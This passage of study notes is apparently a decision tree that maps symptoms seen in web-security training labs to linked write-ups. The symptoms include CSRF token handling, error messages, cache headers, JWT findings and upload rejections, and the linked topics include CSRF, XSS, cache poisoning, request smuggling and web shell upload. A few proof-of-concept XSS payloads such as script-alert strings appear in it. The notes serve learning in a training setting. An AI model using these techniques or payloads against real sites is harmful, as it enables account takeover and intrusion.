	- [Access Control](Access%20Control.md#2.6.%20Lab%20User%20ID%20controlled%20by%20request%20parameter%2C%20with%20unpredictable%20user%20IDs%20%E2%AD%95%EF%B8%8F)
- `POST /my-account/change-email`
	- No `csrf` token
		- [CSRF](CSRF.md#2.1.%20Lab%20CSRF%20vulnerability%20with%20no%20defenses%20%E2%AD%95%EF%B8%8F)
		- [CSRF](CSRF.md#2.7.%20Lab%20SameSite%20Lax%20bypass%20via%20method%20override%20%E2%AD%95%EF%B8%8F)
		- `SameSite=None`
			- [CSRF](CSRF.md#2.11.%20Lab%20CSRF%20where%20Referer%20validation%20depends%20on%20header%20being%20present%20%E2%AD%95%EF%B8%8F)
			- [CSRF](CSRF.md#2.12.%20Lab%20CSRF%20with%20broken%20Referer%20validation%20%E2%AD%95%EF%B8%8F)
		- `SameSite=Strict`
			- [CSRF](CSRF.md#2.8.%20Lab%20SameSite%20Strict%20bypass%20via%20client-side%20redirect%20%E2%AD%95%EF%B8%8F)
	- Yes `csrf` token 
		- Content-Security-Policy
			- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20protected%20by%20very%20strict%20CSP%2C%20with%20dangling%20markup%20attack%20%E2%AD%95%EF%B8%8F)
		- Remove `csrf` token
			- 302 Found
				- [CSRF](CSRF.md#2.2.%20Lab%20CSRF%20where%20token%20validation%20depends%20on%20request%20method%20%E2%AD%95%EF%B8%8F)
				- [CSRF](CSRF.md#2.3.%20Lab%20CSRF%20where%20token%20validation%20depends%20on%20token%20being%20present%20%E2%AD%95%EF%B8%8F)
			- 400 Bad Request: "Missing parameter 'csrf'"
				- [CSRF](CSRF.md#2.4.%20Lab%20CSRF%20where%20token%20is%20not%20tied%20to%20user%20session%20%E2%AD%95%EF%B8%8F)
				- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Exploiting%20XSS%20to%20bypass%20CSRF%20defenses%20%E2%AD%95%EF%B8%8F)
				- [Clickjacking](Clickjacking.md#1%2F2.2.%20Lab%20Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter%20%E2%AD%95%EF%B8%8F)
				- [Clickjacking](Clickjacking.md#1%2F2.3.%20Lab%20Clickjacking%20with%20a%20frame%20buster%20script%20%E2%AD%95%EF%B8%8F)
- "Your API Key is: ..."
	- [Web cache deception](Web%20cache%20deception.md#1%2F2.1.%20Lab%20Exploiting%20path%20mapping%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
	- `Server: Apache-Coyote/1.1`
		- [Web cache deception](Web%20cache%20deception.md#1%2F2.2.%20Lab%20Exploiting%20path%20delimiters%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
	- Cache headers (`X-Cache`, `Age`, etc) only in `/resources`
		- Adding `.js` in `GET /my-account/aaa.js` doesn't reveal cache headers
			- [Web cache deception](Web%20cache%20deception.md#1%2F2.3.%20Lab%20Exploiting%20origin%20server%20normalization%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)
			- [Web cache deception](Web%20cache%20deception.md#1%2F2.4.%20Lab%20Exploiting%20cache%20server%20normalization%20for%20web%20cache%20deception%20%E2%AD%95%EF%B8%8F)

##### Change Email + Delete Account
- `csrf` token
	- remove `csrf` token == 400 Bad Request
		- [Clickjacking](Clickjacking.md#1%2F2.1.%20Lab%20Basic%20clickjacking%20with%20CSRF%20token%20protection%20%E2%AD%95%EF%B8%8F)
		- [Clickjacking](Clickjacking.md#1%2F2.5.%20Lab%20Multistep%20clickjacking%20%E2%AD%95%EF%B8%8F)


##### Change Password + Change Email
- Remove `current-password`
	- 200 OK
		- [Password Reset](Password%20Reset.md#2.7.%20Lab%20Weak%20isolation%20on%20dual-use%20endpoint%20%E2%AD%95%EF%B8%8F)
	- 400 Bad Request: "Missing parameter"
		- [Password Reset](Password%20Reset.md#1.12.%20Lab%20Password%20brute-force%20via%20password%20change%20%E2%AD%95%EF%B8%8F)


#### Every field + File Upload in Blog
##### My account > File Upload
- After uploading `.php` file
	- `GET /.../{FILE}.php`
		- 200 OK
			- [File Uploads](File%20Uploads.md#3.1.%20Lab%20Remote%20code%20execution%20via%20web%20shell%20upload%20%E2%AD%95%EF%B8%8F)
			- [File Uploads](File%20Uploads.md#3.3.%20Lab%20Web%20shell%20upload%20via%20path%20traversal%20%E2%AD%95%EF%B8%8F)
		- "Sorry, file type text/php is not allowed Only image/jpeg and image/png are allowed..."
			- [File Uploads](File%20Uploads.md#3.2.%20Lab%20Web%20shell%20upload%20via%20Content-Type%20restriction%20bypass%20%E2%AD%95%EF%B8%8F)
	- `POST /my-account/avatar`
		- "Sorry, php files are not allowed"
			- [File Uploads](File%20Uploads.md#3.4.%20Lab%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass%20%E2%AD%95%EF%B8%8F)
		- "Sorry, only JPY & PNG files are allowed"
			- [File Uploads](File%20Uploads.md#3.5.%20Lab%20Web%20shell%20upload%20via%20obfuscated%20file%20extension%20%E2%AD%95%EF%B8%8F)
		- "Error: file is not a valid image"
			- [File Uploads](File%20Uploads.md#3.6.%20Lab%20Remote%20code%20execution%20via%20polyglot%20web%20shell%20upload%20%E2%AD%95%EF%B8%8F)

#### Search Bar
##### `/admin`
- "Admin interface only available if logged in as an administrator"
	- JWT
		- <sup>Scan result: YES</sup>[JWT](JWT.md#2.1.%20Lab%20JWT%20authentication%20bypass%20via%20unverified%20signature%20%E2%AD%95%EF%B8%8F)
		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.2.%20Lab%20JWT%20authentication%20bypass%20via%20flawed%20signature%20verification%20%E2%AD%95%EF%B8%8F)
		- <sup>JWT is smaller</sup> [JWT](JWT.md#2.3.%20Lab%20JWT%20authentication%20bypass%20via%20weak%20signing%20key%20%E2%AD%95%EF%B8%8F)
		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.4.%20Lab%20JWT%20authentication%20bypass%20via%20jwk%20header%20injection%20%E2%AD%95%EF%B8%8F)
		- <sup>Scan result: YES</sup> [JWT](JWT.md#2.5.%20Lab%20JWT%20authentication%20bypass%20via%20jku%20header%20injection%20%E2%AD%95%EF%B8%8F)
		- [JWT](JWT.md#2.6.%20Lab%20JWT%20authentication%20bypass%20via%20kid%20header%20path%20traversal%20%E2%AD%95%EF%B8%8F)

##### Change Email
- `POST /my-account/change-email`
	- No `csrf` token
		- -
	- Yes `csrf` token 
		- Remove `csrf` token
			- 400 Bad Request: 
				- "Invalid CSRF token"
					- [CSRF](CSRF.md#2.5.%20Lab%20CSRF%20where%20token%20is%20tied%20to%20non-session%20cookie%20%E2%AD%95%EF%B8%8F)
				- "Missing parameter 'csrf'"
					- [Essential skills](Essential%20skills.md#1%2F2.2.%20Lab%20Scanning%20non-standard%20data%20structures%20%E2%AD%95%EF%B8%8F)
		- `csrf` cookie
			- [CSRF](CSRF.md#2.6.%20Lab%20CSRF%20where%20token%20is%20duplicated%20in%20cookie%20%E2%AD%95%EF%B8%8F)

##### Submit Feedback
- `searchLoggerConfigurable.js`
	- `config.transport_url`
		- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.1.%20Lab%20Client-side%20prototype%20pollution%20via%20browser%20APIs%20%E2%AD%95%EF%B8%8F)
- `searchLogger.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.2.%20Lab%20DOM%20XSS%20via%20client-side%20prototype%20pollution%20%E2%AD%95%EF%B8%8F)
- `searchLoggerFiltered.js`
	- <sup>DOM Invader > Scan for gadgets: script.src(1)</sup> [Client side](Client%20side.md#2.4.%20Lab%20Client-side%20prototype%20pollution%20via%20flawed%20sanitization%20%E2%AD%95%EF%B8%8F)
- `jquery_3-0-0.js`
	- <sup>DOM Invader > Scan for gadgets: eval(1)</sup> [Client side](Client%20side.md#2.3.%20Lab%20DOM%20XSS%20via%20an%20alternative%20prototype%20pollution%20vector%20%E2%AD%95%EF%B8%8F)


##### Use the HTTP Request Smuggling Payload
- 400 Bad Request -- "Both chunked encoding and content-length were specified"
	- Cannot login
		- [HTTP2](HTTP2.md#1.8.%20Lab%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling%20%E2%AD%95%EF%B8%8F)
		- [HTTP2](HTTP2.md#1.11.%20Lab%20HTTP%2F2%20request%20splitting%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)
	- Can login
		- [HTTP2](HTTP2.md#1.10.%20Lab%20HTTP%2F2%20request%20smuggling%20via%20CRLF%20injection%20%E2%AD%95%EF%B8%8F)
		
- 500 Internal Server Error -- "Server Error: Communication timed out"
	- Can login
		- [Others](Others.md#1.5.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20reveal%20front-end%20request%20rewriting%20%E2%AD%95%EF%B8%8F)


---
### Unauthenticated Blog
#### No Comments
##### GraphQL
- GraphQL Visualizer
	- `postPassword: String` in `BlogPost`
		- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.1.%20Lab%20Accessing%20private%20GraphQL%20posts%20%E2%AD%95%EF%B8%8F)
	- `BlogPost` + `User`
		- [GraphQL Endpoints](GraphQL%20Endpoints.md#2.2%20Lab%20Accidental%20exposure%20of%20private%20GraphQL%20fields%20%E2%AD%95%EF%B8%8F)



#### Every field + File Upload in Blog
##### Page Source
- `svg` in `<img>` tag
	- [XXE](XXE.md#3.8.%20Lab%20Exploiting%20XXE%20via%20image%20file%20upload%20%E2%AD%95%EF%B8%8F)
- `indexOf('http')` + `addEventListener`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.2.%20Lab%20DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL%20%E2%AD%95%EF%B8%8F)


#### Every field
##### Page Source
- `rel="canonical"`
	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20in%20canonical%20link%20tag%20%E2%AD%95%EF%B8%8F)

##### `X-Cache`
- Query string in response like `?cb=123` + `X-Cache: miss` <sup>X-Cache has to say miss and cb=123 is reflected in response</sup>
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.5.Lab%20Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string%20%E2%AD%95%EF%B8%8F)
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.6.Lab%20Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter%20%E2%AD%95%EF%B8%8F)
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.9.%20Lab%20URL%20normalization%20%E2%AD%95%EF%B8%8F)
- Param Miner > Guess query params > Parameter Cloaking
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.7.Lab%20Parameter%20cloaking%20%E2%AD%95%EF%B8%8F)
- `/js/geolocate.js?callback=setCountryCookie`
	- [Web Cache Poisoning](Web%20Cache%20Poisoning.md#1.8.%20Lab%20Web%20cache%20poisoning%20via%20a%20fat%20GET%20request%20%E2%AD%95%EF%B8%8F)

##### Submit Feedback
- `jQuery 1.8.2`
	- `GET /feedback?returnPath=/`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.5.%20Lab%20DOM%20XSS%20in%20jQuery%20anchor%20%60href%60%20attribute%20sink%20using%20%60location.search%60%20source%20%E2%AD%95%EF%B8%8F)
- `csrf` token in `POST /feedback/submit`
	- [Clickjacking](Clickjacking.md#1%2F2.4.%20Lab%20Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS%20%E2%AD%95%EF%B8%8F)

##### Target > Engagement tools > Search
- `returnUrl = /url`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.4.%20Lab%20DOM-based%20open%20redirection%20%E2%AD%95%EF%B8%8F)
- `html.replace`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Stored%20DOM%20XSS%20%E2%AD%95%EF%B8%8F)
- `hashchange`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hashchange%20event%20%E2%AD%95%EF%B8%8F)

##### Post Comment
- Solved with `</p><script>alert(1)</script>`
	- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20HTML%20context%20with%20nothing%20encoded%20%E2%AD%95%EF%B8%8F)
- `name` field is a hyperlink
	- Solve with `javascript:alert(1)`
		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20anchor%20%60href%60%20attribute%20with%20double%20quotes%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
	- `website` field has client side validation
		- [Stored XSS](Stored%20XSS.md#1.x.%20Lab%20Stored%20XSS%20into%20%60onclick%60%20event%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20and%20backslash%20escaped%20%E2%AD%95%EF%B8%8F)


##### Use this HTTP Request Smuggling Payload: [README](../Stage%201/HTTP%20Request%20Smuggling/README.md#%5Eosmqx6)
- 500 Internal Server Error
	- "Server Error: Communication timed out"
		- [CL](CL.md#1.1.%20Lab%20HTTP%20request%20smuggling%2C%20confirming%20a%20CL.TE%20vulnerability%20via%20differential%20responses%20%E2%AD%95%EF%B8%8F)
		- [CL](CL.md#1.x.%20Lab%20HTTP%20request%20smuggling%2C%20basic%20CL.TE%20vulnerability%20%E2%AD%95%EF%B8%8F)
		- `User-Agent` reflected in response in `GET /post?postId=`
			- [CL](CL.md#1.7.%20Lab%20Exploiting%20HTTP%20request%20smuggling%20to%20deliver%20reflected%20XSS%20%E2%AD%95%EF%B8%8F)
- 400 Bad Request
	- [TE](TE.md#1.2.%20Lab%20HTTP%20request%20smuggling%2C%20confirming%20a%20TE.CL%20vulnerability%20via%20differential%20responses%20%E2%AD%95%EF%B8%8F)
	- [TE](TE.md#1.x.%20Lab%20HTTP%20request%20smuggling%2C%20basic%20TE.CL%20vulnerability%20%E2%AD%95%EF%B8%8F)
	- [Others](Others.md#1.x.%20Lab%20CL.0%20request%20smuggling%20%E2%AD%95%EF%B8%8F)

##### "HTML is allowed"
- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Exploiting%20DOM%20clobbering%20to%20enable%20XSS%20%E2%AD%95%EF%B8%8F)


#### Search Bar
##### Use the HTTP Request Smuggling Payload
- 400 Bad Request
	- "Both chunked encoding and content-length were specified"
		- [HTTP2](HTTP2.md#1.9.%20Lab%20H2.CL%20request%20smuggling%20%E2%AD%95%EF%B8%8F)

##### DOM Invader
- Inject forms > Search
	- `document.write(1)`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20%60document.write%60%20sink%20using%20source%20%60location.search%60%20%E2%AD%95%EF%B8%8F)
	- `element.InnerHTML(1)`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.4.%20Lab%20DOM%20XSS%20in%20%60innerHTML%60%20sink%20using%20source%20%60location.search%60%20%E2%AD%95%EF%B8%8F)
	- `element.setAttribute.href(1)` / `ng-app` / `angular 1.7.7`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20DOM%20XSS%20in%20AngularJS%20expression%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
	- `eval(1)`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.x.%20Lab%20Reflected%20DOM%20XSS%20%E2%AD%95%EF%B8%8F)

##### Enter XSS Payload
```
<script>alert(1)</script>
```
- Solved with payload
	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded%20%E2%AD%95%EF%B8%8F)
- `&lt;script&gt;alert(1)&lt;/script&gt;`
	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20attribute%20with%20angle%20brackets%20HTML-encoded%20%E2%AD%95%EF%B8%8F)
- `var searchTerms`
	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20HTML%20encoded%20%E2%AD%95%EF%B8%8F)
	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote%20and%20backslash%20escaped%20%E2%AD%95%EF%B8%8F)
	- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped%20%E2%AD%95%EF%B8%8F)
- `var message`
	- Payload enclosed in backticks
		- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets%2C%20single%2C%20double%20quotes%2C%20backslash%20and%20backticks%20Unicode-escaped%20%E2%AD%95%EF%B8%8F)
- `var key`
	- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20without%20strings%20%E2%AD%95%EF%B8%8F)
- "Tag is not allowed"
	- `<body>` / `<custom tags>` allowed
		- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked%20%E2%AD%95%EF%B8%8F)
	- `<svg>` allowed
		- [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20with%20some%20SVG%20markup%20allowed%20%E2%AD%95%EF%B8%8F)
	- `<xss+id=x>#x';` allowed
		- <sup>Scan results: YES</sup> [Reflected XSS](Reflected%20XSS.md#1.x.%20Lab%20Reflected%20XSS%20into%20HTML%20context%20with%20all%20tags%20blocked%20except%20custom%20ones%20%E2%AD%95%EF%B8%8F)





---

>[!info] Circle emoji ⭕️ next to Lab titles
>It means that lab has been linked to this page.


